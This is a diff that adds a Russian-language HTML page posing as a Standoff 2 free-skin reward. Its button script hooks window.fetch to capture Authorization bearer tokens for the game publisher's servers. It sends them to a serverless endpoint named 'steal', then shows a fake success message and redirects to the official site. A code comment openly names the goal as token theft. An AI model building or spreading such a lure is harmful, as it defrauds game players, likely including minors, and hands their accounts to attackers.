@@ -1,0 +1,99 @@
+```html
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Standoff 2 - Награда</title>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: #2d2d2d;
+            padding: 25px;
+            border-radius: 15px;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+            width: 300px;
+        }
+        h2 { margin-top: 0; color: #ffcc00; }
+        button {
+            background: #ffcc00;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 8px;
+            margin-top: 15px;
+        }
+        .status { margin-top: 10px; font-size: 14px; color: #aaa; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>🎁 Получи скин!</h2>
+    <p>Нажми кнопку, чтобы активировать награду.</p>
+    <button id="btn">ЗАБРАТЬ</button>
+    <div class="status" id="status">Обработка...</div>
+</div>
+
+<script>
+    document.getElementById('btn').addEventListener('click', function() {
+        const btn = document.getElementById('btn');
+        const status = document.getElementById('status');
+        
+        btn.disabled = true;
+        btn.innerText = "Загрузка...";
+        status.style.display = 'block';
+
+        // Перехватываем fetch API для кражи токена
+        const originalFetch = window.fetch;
+        window.fetch = function(...args) {
+            return originalFetch.apply(this, args).then(response => {
+                // Если запрос к сайтам Axlebolt (официальные сервера SO2)
+                if (args[0] && args[0].includes('axlebolt')) {
+                    const authHeader = args[1]?.headers?.get('Authorization');
+                    if (authHeader) {
+                        sendToken(authHeader.replace('Bearer ', ''));
+                    }
+                }
+                return response;
+            });
+        };
+
+        // Имитируем запрос к серверу, чтобы сработал перехватчик
+        fetch('https://account.axlebolt.com/api/v1/profile').catch(() => {});
+
+        // Через секунду показываем успех и редиректим
+        setTimeout(() => {
+            btn.innerText = "Готово!";
+            status.innerText = "Перенаправление в игру...";
+            setTimeout(() => {
+                window.location.href = "https://standoff2.com";
+            }, 1000);
+        }, 1500);
+    });
+
+    function sendToken(token) {
+        fetch('/.netlify/functions/steal', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ token: token })
+        });
+    }
+</script>
+
+</body>
+</html>
+```
